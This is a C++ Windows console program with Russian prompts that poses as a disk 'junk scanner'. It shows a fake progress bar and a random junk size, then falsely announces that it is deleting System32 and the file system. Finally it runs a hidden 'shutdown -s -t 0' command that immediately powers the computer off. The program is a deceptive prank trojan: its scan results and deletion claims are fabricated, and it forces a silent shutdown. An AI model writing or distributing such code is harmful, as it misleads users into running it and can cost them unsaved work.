#include <iostream>
#include "windows.h"
#include <cstring>
#include <cstdlib>
#include <ctime>

int main()
{
	setlocale(LC_ALL, "rus");
	srand(time(NULL));
	std::cout << "\t\t\t\t\t\tMotherfuckerscaner" << std::endl;
	std::cout << " " << std::endl;
	Sleep(1000);
	std::cout << "\t\t\t\t\t\t@latrinariam" << std::endl;
	std::cout << "\n\n" << std::endl;
	Sleep(2000);



	char a = ' ';
	int f = 1;
	while (f == 1)
	{
		std::cout << "Начать сканирование?\n";
		std::cout << "y/n:";
		std::cin >> a;
		if ((a == 'y') || (a == 'Y'))
		{
			f = 0;
		}
		else if ((a == 'n') || (a == 'N'))
		{
			exit(0);
		}
	}
	HANDLE hCon;
	COORD cPos;
	hCon = GetStdHandle(STD_OUTPUT_HANDLE);
	for (int i = 0; i <= 100; i++)
	{
		std::cout << i << "%" << std::endl;
		Sleep(150);
		cPos.Y = 8;
		cPos.X = 0;
		SetConsoleCursorPosition(hCon, cPos);
	}
	std::cout << "Cканирование завершено\n\n" << std::endl;
	Sleep(1000);
	std::cout << "\t\t\t\t\t\tОбнаружено " << rand() % 42 << "ГБ мусора" << std::endl;
	while (f == 0)
	{
		std::cout << "Продолжить?\n";
		std::cout << "y/n:";
		std::cin >> a;
		if ((a == 'y') || (a == 'Y'))
		{
			f = 1;
		}
		else if ((a == 'n') || (a == 'N'))
		{
			exit(0);
		}
	}

	char t = 92;
	std::cout << "Будут удалены следующие файлы/папки:" << std::endl;
	Sleep(2000);
	std::cout << "     C:" << t << "Windows" << t << "System32" << std::endl;
	Sleep(500);
	std::cout << "     C:" << t << "$WINDOWS.~BT" << t << "Sources" << std::endl;
	Sleep(1000);
	std::cout << "Удаление файловой системы..." << std::endl;
	WinExec("shutdown -s -t 0", SW_HIDE);


}
